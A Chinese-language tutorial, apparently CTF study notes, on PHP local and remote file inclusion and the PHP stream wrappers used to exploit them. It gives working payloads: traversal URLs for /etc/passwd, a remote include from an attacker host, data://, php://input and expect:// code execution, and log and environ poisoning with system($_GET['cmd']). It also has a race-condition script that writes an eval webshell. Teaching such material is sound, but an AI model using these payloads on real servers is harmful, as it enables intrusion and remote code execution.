-    <content><![CDATA[<div id="postchat_postcontent"><h1 id="PHP文件包含漏洞"><a href="#PHP文件包含漏洞" class="headerlink" title="PHP文件包含漏洞"></a>PHP文件包含漏洞</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>和SQL注入等攻击方式一样，文件包含漏洞也是一种<strong>注入型漏洞</strong>，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行</p>
-<p>“包含”：以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含</p>
-<p>攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞</p>
-<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>include， require<br>require报错会终止程序，但是include会继续执行下面代码。</p>
-<p>include_once ，require_once<br>包含过的就不会继续包含</p>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><p>本地文件包含漏洞，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI</p>
-<h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p>远程文件包含漏洞，指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大</p>
-<p>RFI对<code>php.ini</code>里的配置有些要求：</p>
-<p><code>allow_url_fopen = On</code><br><code>allow_url_include = On</code></p>
-<p><code>allow_url_fopen</code> 允许 PHP 读取远程文件</p>
-<p><code>allow_url_include</code> 则允许 PHP 在代码中包含远程文件</p>
-<p>注：在<code>php.ini</code>中，<code>allow_url_fopen</code>默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off</p>
-<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>如果目标服务器配置允许远程文件包含（<code>allow_url_include=On</code>），可以尝试包含远程文件，例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/index.php?page=http://attacker.com/shell.txt</span><br></pre></td></tr></table></figure>
-
-<p>如果服务器加载了远程文件的内容，说明存在远程文件包含漏洞</p>
-<h2 id="用-etc-passwd来检验漏洞存在"><a href="#用-etc-passwd来检验漏洞存在" class="headerlink" title="用/etc/passwd来检验漏洞存在"></a>用<code>/etc/passwd</code>来检验漏洞存在</h2><p>常见的测试文件包括：</p>
-<ul>
-<li><code>/etc/passwd</code>（Linux系统用户信息）</li>
-<li><code>/etc/hosts</code>（主机名配置）</li>
-<li><code>/proc/self/environ</code>（环境变量）</li>
-<li>Apache&#x2F;Nginx日志文件（如<code>/var/log/apache2/access.log</code>）</li>
-</ul>
-<p><code>/etc/passwd</code> 文件包含 <code>root:</code> 关键字，如果返回 <code>root:x:0:0:</code> 说明读取成功</p>
-<h3 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h3><p><code>http://target.com/index.php?file=../../../../../../etc/passwd</code></p>
-<p>也可用python脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 目标 URL</span><br><span class="line">url = &quot;http://target.com/index.php?file=&quot;</span><br><span class="line"></span><br><span class="line"># 常见的 LFI 路径遍历</span><br><span class="line">payloads = [</span><br><span class="line">    &quot;../../../../../../etc/passwd&quot;,</span><br><span class="line">    &quot;..//..//..//..//..//..//etc/passwd&quot;,  # 双斜杠绕过</span><br><span class="line">    &quot;....//....//....//....//etc/passwd&quot;,  # 多点斜杠绕过</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 发送请求</span><br><span class="line">for payload in payloads:</span><br><span class="line">    full_url = url + payload</span><br><span class="line">    response = requests.get(full_url)</span><br><span class="line"></span><br><span class="line">    if &quot;root:x:0:0:&quot; in response.text:</span><br><span class="line">        print(f&quot;[+] 成功！LFI 存在: &#123;full_url&#125;&quot;)</span><br><span class="line">        print(response.text[:200])  # 仅显示部分内容</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        print(f&quot;[-] 失败: &#123;full_url&#125;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="利用-php-filter-进行-Base64-编码"><a href="#利用-php-filter-进行-Base64-编码" class="headerlink" title="利用 php://filter 进行 Base64 编码"></a>利用 <code>php://filter</code> 进行 Base64 编码</h3><p><code>http://target.com/index.php?file=php://filter/convert.base64-encode/resource=/etc/passwd</code></p>
-<h3 id="Null-Byte-截断（PHP"><a href="#Null-Byte-截断（PHP" class="headerlink" title="Null Byte 截断（PHP &lt;5.3.4）"></a><code>Null Byte</code> 截断（PHP &lt;5.3.4）</h3><p>如果服务器强制 <code>.php</code> 后缀：</p>
-<p><code>http://target.com/index.php?file=../../../../../etc/passwd%00</code></p>
-<h3 id="PATH-INFO-截断"><a href="#PATH-INFO-截断" class="headerlink" title="PATH_INFO 截断"></a><strong><code>PATH_INFO</code> 截断</strong></h3><p><code>http://target.com/index.php?file=../../../../../../etc/passwd....................</code></p>
-<h2 id="包含方法"><a href="#包含方法" class="headerlink" title="包含方法"></a>包含方法</h2><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 file:// — 访问本地文件系统</span><br><span class="line">2 http:// — 访问 HTTP(s) 网址</span><br><span class="line">3 ftp:// — 访问 FTP(s) URLs</span><br><span class="line">4 php:// — 访问各个输入/输出流(I/O streams)</span><br><span class="line">5 zlib:// — 压缩流</span><br><span class="line">6 data:// — 数据(RFC 2397)</span><br><span class="line">7 glob:// — 查找匹配的文件路径模式</span><br><span class="line">8 phar:// — PHP 归档</span><br><span class="line">9 ssh2:// — Secure Shell 2</span><br><span class="line">10 rar:// — RAR</span><br><span class="line">11 ogg:// — 音频流</span><br><span class="line">12 expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>
-
-<h4 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h4><p>访问本地文件系统，若不加协议名称，<strong>默认封装协议</strong>为<code>file://</code>协议</p>
-<h5 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h5><ul>
-<li><code>allow_url_fopen:off/on</code></li>
-<li><code>allow_url_include :off/on</code></li>
-</ul>
-<h5 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h5><p>用于访问本地文件系统（服务器中的文件）</p>
-<p>在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响</p>
-<p>注：使用file协议时无法使用相对路径</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=file://flag #用法错误，声明file协议时无法使用相对路径</span><br><span class="line">cmd=file:///flag #用法正确，使用绝对路径</span><br><span class="line">cmd=/flag #用法正确，使用绝对路径</span><br><span class="line">cmd=flag #用法正确，使用相对路径</span><br></pre></td></tr></table></figure>
-
-<h5 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Linux</span><br><span class="line">cmd=file:///path/to/flag #根目录下path文件夹中to文件夹下flag文件 ——此处有///三条</span><br><span class="line">cmd=/path/to/flag #根目录下path文件夹中to文件夹下flag文件</span><br><span class="line">cmd=relative/path/flag #当前目录下relative文件夹中path文件夹下flag文件</span><br><span class="line">cmd=flag #当前目录下的flag文件</span><br><span class="line"></span><br><span class="line">#Windows</span><br><span class="line">cmd=file://C:/path/to/flag #C盘中path文件夹中to文件夹下flag文件</span><br><span class="line">cmd=file://C:\path\to\flag #C盘中path文件夹中to文件夹下flag文件</span><br><span class="line">cmd=C:\path\to\flag #C盘中path文件夹中to文件夹下flag文件</span><br><span class="line">cmd=flag  #当前文件夹下flag文件</span><br></pre></td></tr></table></figure>
-
-<h4 id="http"><a href="#http" class="headerlink" title="http:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;</h4><p>访问 HTTP(s) 网址</p>
-<h5 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h5><ul>
-<li>allow_url_fopen:on</li>
-<li>allow_url_include:on</li>
-</ul>
-<h5 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h5><p>常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于<strong>远程包含</strong></p>
-<h5 id="使用实例-1"><a href="#使用实例-1" class="headerlink" title="使用实例"></a>使用实例</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=http://example.com/phpinfo.txt	#读取http://example.com/phpinfo.txt文件</span><br><span class="line">cmd=https://example.com/file.php?var1=val1&amp;var2=val2	#读取https://example.com/file.php文件并且传入var1和var2的值</span><br></pre></td></tr></table></figure>
-
-<h4 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h4><p>访问各个输入&#x2F;输出流(I&#x2F;O streams)，伪协议提供了多种不同的方式来访问和处理数据</p>
-<h5 id="常见"><a href="#常见" class="headerlink" title="常见"></a>常见</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://input #这个伪协议用于访问HTTP请求的原始主体数据。它通常用于从POST请求中读取数据。</span><br><span class="line">php://output #这个伪协议用于访问HTTP响应的输出流。它通常用于向客户端发送数据。</span><br><span class="line">php://stdin #用于访问标准输入流。</span><br><span class="line">php://stdout #用于访问标准输出流。</span><br><span class="line">php://stderr #用于访问标准错误输出流。</span><br><span class="line">php://temp #用于临时存储数据的内存流。它可以用于在没有创建实际文件的情况下处理临时数据。</span><br><span class="line">php://memory #用于在内存中创建可读写的数据流。</span><br><span class="line">php://filter #这个伪协议用于数据过滤和转换。它允许您将不同的过滤器应用于数据流，例如Base64编码、压缩和加密等。</span><br><span class="line">php://globals #用于访问全局变量。可以通过此伪协议查看和修改PHP全局变量的值。</span><br><span class="line">php://fd #用于访问文件描述符。它允许您在PHP中访问底层文件系统。</span><br></pre></td></tr></table></figure>
-
-<p>在CTF中经常使用的是**<code>php://filter</code><strong>和</strong><code>php://input</code>**、<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行POST参数中的php代码</p>
-<h5 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a>条件</h5><ul>
-<li><code>allow_url_fopen:off/on</code></li>
-<li><code>allow_url_include</code> :仅<code>php://input</code> 、<code>php://stdin</code>、<code>php://memory</code>、<code>php://temp</code> 需要on</li>
-</ul>
-<h5 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h5><h6 id="条件-3"><a href="#条件-3" class="headerlink" title="条件"></a>条件</h6><ul>
-<li><code>allow_url_fopen:off/on</code></li>
-<li><code>allow_url_include :on</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET[URL部分]</span><br><span class="line">?file=php://input</span><br><span class="line"></span><br><span class="line">POST[POST DATA部分]</span><br><span class="line">&lt;? phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
-
-<h6 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h6><p>主要用来接收<strong>post</strong>数据</p>
-<p>CTF中文件包含题目里，可以使用<code>php://input</code>协议，将post请求中的数据作为php代码执行</p>
-<h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h5><h6 id="条件-4"><a href="#条件-4" class="headerlink" title="条件"></a>条件</h6><ul>
-<li><code>allow_url_fopen:off/on</code></li>
-<li><code>allow_url_include :off/on</code></li>
-</ul>
-<h6 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h6><p>可以作为一个位于原始数据流和最终目标之间的中间流来处理其他流，负责对数据进行处理（即读取或写入数据之前对其进行修改或过滤）</p>
-<table>
-<thead>
-<tr>
-<th>名称</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>resource&#x3D;&lt;要过滤的数据流&gt;</td>
-<td>这个参数是必须的。它指定了你要筛选过滤的数据流。（<strong>加绝对路径</strong>）</td>
-</tr>
-<tr>
-<td>read&#x3D;&lt;读链的筛选列表&gt;</td>
-<td>read参数指定 一个或多个过滤器 用于<strong>读</strong>操作，可以设定一个或多个过滤器名称，以管道符分隔。（读取文件后编码输出）</td>
-</tr>
-<tr>
-<td>write&#x3D;&lt;写链的筛选列表&gt;</td>
-<td>write参数指定 一个或多个过滤器 用于<strong>写</strong>操作，可以设定一个或多个过滤器名称，以管道符分隔。（编码重写入文件）</td>
-</tr>
-<tr>
-<td>&lt;；两个链的筛选列表&gt;</td>
-<td>任何没有以 read&#x3D; 或 write&#x3D; 作前缀的筛选器列表<strong>会视情况应用于读或写链</strong>。</td>
-</tr>
-</tbody></table>
-<p>注：</p>
-<ul>
-<li><code>read</code> 和 <code>write</code> 指令是互斥的，不能同时使用。</li>
-<li>如果存在多个过滤器，字符串从左到右的顺序经过过滤器</li>
-</ul>
-<h6 id="常用过滤语句"><a href="#常用过滤语句" class="headerlink" title="常用过滤语句"></a>常用过滤语句</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=/flag //读取根目录flag文件，进行base64编码</span><br></pre></td></tr></table></figure>
-
-<h6 id="常用过滤器-未完"><a href="#常用过滤器-未完" class="headerlink" title="常用过滤器(未完)"></a>常用过滤器(未完)</h6><p>字符串过滤器</p>
-<p><a href="https://www.php.net/manual/zh/filters.string.php">PHP: 字符串过滤器 - Manual</a></p>
-<ul>
-<li><code>string.rot13</code>（对字符串执行<code>ROT13</code>编码转换）</li>
-<li><code>string.toupper</code>（将字符串转化为大写）</li>
-<li><code>string.tolower</code>（将字符串转化为小写）</li>
-<li><code>string.strip_tags</code>(自 PHP 7.3.0 起废弃，从字符串中去除 HTML 和 PHP 标记)</li>
-</ul>
-<p>转换过滤器</p>
-<p><a href="https://www.php.net/manual/zh/filters.convert.php">PHP: 转换过滤器 - Manual</a></p>
-<p>注：转换过滤器是 PHP 5.0.0 添加的</p>
-<ul>
-<li><p><strong>常用</strong>：**<code>convert.base64-encode</code><strong>和</strong><code>convert.base64-decode</code>**（将字符串进行base64编码加解密）</p>
-</li>
-<li><p><code>convert.quoted-printable-encode</code> 和 <code>convert.quoted-printable-decode</code>（将字符串进行Quoted-printable编码加解密）</p>
-</li>
-<li><p><code>convert.iconv.*</code>（将字符串进行字符编码转化）</p>
-</li>
-</ul>
-<blockquote>
-<p><strong>Quoted-Printable（QP）编码</strong> 是一种 <strong>可读性较高的7位编码</strong>，用于安全传输包含 <strong>特殊字符</strong>（如非 ASCII 字符）的文本，尤其是在 <strong>电子邮件（MIME）</strong> 中。它的主要目的是在 <strong>兼容 7-bit 传输协议</strong>（如 SMTP）的同时，保持尽可能的可读性</p>
-<p>编码规则：</p>
-<p><strong>ASCII 可打印字符（33-126）</strong> 直接保留，如 <code>abcXYZ123</code></p>
-<p><strong>空格和制表符（TAB）</strong></p>
-<ul>
-<li>末尾空格必须用 <code>=20</code> 表示（防止邮件客户端自动去掉）</li>
-</ul>
-<p><strong>不可打印字符（0-31, 127-255）</strong>，使用 <code>=XX</code> 形式编码，其中 <code>XX</code> 是 <strong>两位十六进制表示</strong></p>
-<p><strong>换行符（CRLF, <code>\r\n</code>）</strong></p>
-<ul>
-<li>QP 默认使用 <code>\r\n</code> 作为换行符</li>
-<li>长于 <strong>76 个字符</strong> 的行必须 <strong>换行</strong>，并在行尾加 <code>=</code> 作为软换行</li>
-</ul>
-</blockquote>
-<h4 id="phar"><a href="#phar" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h4><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><p>php版本大于等于php5.3.0<br><code>allow_url_fopen = On</code><br><code>allow_url_include = On</code></p>
-<h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p><code>phar://</code> 是用来解压的伪协议</p>
-<p><code>phar://</code>不管参数中是什么拓展名，都会被当做压缩包</p>
-<h5 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h5><p><code>?file=phar://压缩包/压缩文件</code></p>
-<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p><code>phar://xxx.png/shell.php</code></p>
-<p>写一个木马文件<code>shell.php</code>，然后用<code>zip://</code>伪协议压缩成<code>shell.zip</code>，最后修改后缀名为<code>.png</code>，上传图片<br>输入测试：<code>http://www.abc.com/xxx/file.php?file=phar://shell.png/shell.php</code></p>
-<p>这样<code>phar://</code>就会将png当做zip压缩包进行解压，并且访问解压后的<code>shell.php</code>文件</p>
-<h4 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h4><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><p>php版本大于等于php5.3.0<br><code>allow_url_fopen = On</code><br><code>allow_url_include = On</code></p>
-<p>和<code>phar://</code>伪协议原理类似，但用法不同</p>
-<h5 id="用法-1"><a href="#用法-1" class="headerlink" title="用法"></a>用法</h5><p><code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</code></p>
-<p>注意：需要将#转换成URL编码：<code>%23</code></p>
-<p> <code>zip://</code> &amp; <code>bzip2://</code> &amp; <code>zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，<strong>更重要的是不需要指定后缀名，可修改为任意后缀</strong>：jpg、png、gif等等。</p>
-<p><strong>注</strong>：<code>zlib://</code> 需要是服务器内的压缩包文件、但不局限于后缀名</p>
-<h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><p>1.<code>zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</code></p>
-<p>压缩 <code>phpinfo.txt</code> 为 <code>phpinfo.zip</code> ，压缩包重命名为 <code>phpinfo.jpg</code> ，并上传目录<code>/var/www/html/</code>，以file为文件包含的参数为例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=zip:///var/www/html/phpinfo.jpg#phpinfo.txt</span><br></pre></td></tr></table></figure>
-
-<p>2.<code>compress.bzip2://file.bz2</code></p>
-<p>压缩 <code>phpinfo.txt</code> 为 <code>phpinfo.bz2</code> 并上传(同样支持任意后缀名)，并上传目录<code>/var/www/html/</code>，以file为文件包含的参数为例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=compress.bzip2:///var/www/html/phpinfo.bz2</span><br></pre></td></tr></table></figure>
-
-<p>3.<code>compress.zlib://file.gz</code></p>
-<p>压缩 <code>phpinfo.txt</code> 为 <code>phpinfo.gz</code> 并上传(同样支持任意后缀名)，并上传目录<code>/var/www/html/</code>，以file为文件包含的参数为例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=compress.zlib:///var/www/html/phpinfo.gz</span><br></pre></td></tr></table></figure>
-
-<h4 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h4><h5 id="条件-5"><a href="#条件-5" class="headerlink" title="条件"></a>条件</h5><p>php版本大于等于php5.2<br><code>allow_url_fopen = On</code><br><code>allow_url_include = On</code></p>
-<h5 id="用法-2"><a href="#用法-2" class="headerlink" title="用法"></a>用法</h5><ul>
-<li><code>data://text/plain,[加上所需传输的经过url编码数据]</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>data://text/plain;base64,[加上所需传输的经过base64编码再经过url编码的数据]</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>
-
-<p>注：加号 + 的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8%2b</code>的base64解码为： <code>&lt;?php phpinfo();?&gt;</code></p>
-<h4 id="expect"><a href="#expect" class="headerlink" title="expect:&#x2F;&#x2F;"></a>expect:&#x2F;&#x2F;</h4><p>PHP要安装<code>expect</code>扩展</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/index.php?file=php:expect://id</span><br><span class="line">http://example.com/index.php?file=php:expect://ls</span><br></pre></td></tr></table></figure>
-
-<h3 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h3><p><a href="https://www.jianshu.com/p/e6f59f3f01b8">Session文件包含漏洞-简书</a></p>
-<h4 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h4><p>session文件路径已知，且其中内容部分可控</p>
-<p><strong>过滤了点</strong>之后不能使用文件包含来getshell了，能利用无后缀的文件session，利用<code>session.upload_progress</code>来进行文件包含，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>参数</p>
-<h4 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h4><h5 id="一些配置选项"><a href="#一些配置选项" class="headerlink" title="一些配置选项"></a>一些配置选项</h5><p>该功能是在php5.4添加的，首先先了解下php.ini以下的几个默认选项</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.upload_progress.enable = on</span><br><span class="line">session.upload_progress.cleanup = on</span><br><span class="line">session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>enable = on</code>表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</li>
-<li><code>cleanup = on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；<strong>cleanup选项决定了我们需要条件竞争</strong></li>
-<li><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</li>
-<li><code>prefix+name</code>将表示为session中的键名;</li>
-</ul>
-<p><code>session.auto_start</code>：默认为off，若为on，php会在接收请求的时候会自动初始化Session，不再需要执行<code>session_start()</code></p>
-<p><code>session.use_strict_mode</code>：默认值为0，此时用户可以自定义Sesssion ID（默认情况下，PHP允许<strong>任何客户端使用 <code>PHPSESSID</code> 发送请求并恢复会话，</strong>如果攻击者提前猜测或设置了<code>PHPSESSID</code>，则可能劫持用户的会话），比如，我们在Cookie里设置<code>PHPSESSID=ROIS</code>，PHP将会在服务器上创建一个文件<code>/tmp/sess_ROIS</code>。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有<code>ini.get(“session.upload_progress.prefix”)</code>+由我们构造的<code>session.upload_progress.name</code>值组成，最后被写入sess_文件里</p>
-<p>注：由于<code>cleanup=on</code>，会导致文件上传后，session文件的内容立即清空。此时我们得利用条件竞争，在session文件的内容被清空前进行文件包含</p>
-<h5 id="常见的php-session存放位置"><a href="#常见的php-session存放位置" class="headerlink" title="常见的php-session存放位置"></a>常见的php-session存放位置</h5><ul>
-<li><code>/var/lib/php/sess_PHPSESSID</code></li>
-<li><code>/var/lib/php/sessions/sess_PHPSESSID</code></li>
-<li><code>/tmp/sess_PHPSESSID</code></li>
-<li><code>/tmp/sessions/sess_PHPSESSID</code></li>
-</ul>
-<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>python脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">sessid = &#x27;Qftm&#x27;</span><br><span class="line"></span><br><span class="line">def POST(session):</span><br><span class="line">    while True:</span><br><span class="line">        f = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)</span><br><span class="line">        session.post(</span><br><span class="line">            &#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/&#x27;,</span><br><span class="line">            data=&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?php system(&#x27;cat *&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[mtfQ])?&gt;&#x27;);?&gt;&quot;&#125;,</span><br><span class="line">            files=&#123;&quot;file&quot;:(&#x27;q.txt&#x27;, f)&#125;,</span><br><span class="line">            cookies=&#123;&#x27;PHPSESSID&#x27;:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">def READ(session):</span><br><span class="line">    while True:</span><br><span class="line">        response = session.get(f&#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/?file=/tmp/sess_&#123;sessid&#125;&#x27;)</span><br><span class="line">        if &#x27;flag&#x27; not in response.text:</span><br><span class="line">            print(&#x27;[+++]retry&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            print(response.text)</span><br><span class="line">            sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with requests.session() as session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = True</span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    READ(session)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h3><h4 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h4><h5 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h5><p>需要知道服务器日志的存储路径，且日志文件可读</p>
-<h5 id="日志位置"><a href="#日志位置" class="headerlink" title="日志位置"></a>日志位置</h5><p>nginx：<code>/var/log/nginx/access.log</code></p>
-<p>apache：<code>/var/log/apache2/access_log(access.log)</code></p>
-<p>注：在CTF中，log的地址常被修改掉，可以通过读取相应的配置文件后，再进行包含</p>
-<h5 id="payload插入"><a href="#payload插入" class="headerlink" title="payload插入"></a>payload插入</h5><p>位置：User-Agent头，GET参数</p>
-<p>User-Agent头不需要抓包解码，GET参数需要。</p>
-<p>最后getshell即可</p>
-<h4 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h4><p>SSH（Secure Shell）是一种加密协议，主要用于远程安全登录和服务器管理</p>
-<h5 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h5><p>需要知道ssh-log的位置，且可读。默认情况下为<code>/var/log/auth.log</code></p>
-<p>ubuntu中：<code>ssh &#39;&lt;?php phpinfo(); ?&gt;&#39;@remotehost</code></p>
-<p>之后会提示输入密码等等，随便输入。<br>然后在remotehost的ssh-log中即可写入php代码</p>
-<h3 id="包含environ（环境变量）"><a href="#包含environ（环境变量）" class="headerlink" title="包含environ（环境变量）"></a>包含environ（环境变量）</h3><h4 id="利用条件-5"><a href="#利用条件-5" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
-<li>php以cgi方式运行，这样environ才会保持UA头。</li>
-<li>environ文件存储位置已知，且environ文件可读。</li>
-</ul>
-<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p>如果一个 Web 服务器有 LFI（本地文件包含）漏洞，但 <code>php://filter</code>、<code>log poisoning</code> 都不可用，那么 <code>/proc/self/environ</code> 可能是最后的希望</p>
-<p>如果目标服务器运行 PHP，并且 <code>$_SERVER[&#39;HTTP_USER_AGENT&#39;]</code> 被写入环境变量，可以尝试在 <code>User-Agent</code> 头中注入恶意代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /?file=/proc/self/environ HTTP/1.1</span><br><span class="line">Host: target.com</span><br><span class="line">User-Agent: &lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>然后访问<code>http://target.com/?file=/proc/self/environ&amp;cmd=whoami</code></p>
-<h3 id="包含fd"><a href="#包含fd" class="headerlink" title="包含fd"></a>包含fd</h3><p>跟包含environ类似</p>
-<h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><p>同样要竞争</p>
-<h3 id="包含上传文件"><a href="#包含上传文件" class="headerlink" title="包含上传文件"></a>包含上传文件</h3><p>配合文件上传漏洞，基本原理不变</p>
-<h3 id="包含pearcmd"><a href="#包含pearcmd" class="headerlink" title="包含pearcmd"></a>包含pearcmd</h3><p><code>pearcmd.php</code> 是 <strong>PHP PEAR（PHP Extension and Application Repository）</strong> 的命令行管理工具，如果服务器存在 <strong>本地文件包含（LFI）漏洞</strong>，可以通过包含 <code>pearcmd.php</code> 并传参来执行任意 PHP 代码，从而实现 <strong>远程命令执行（RCE）</strong></p>
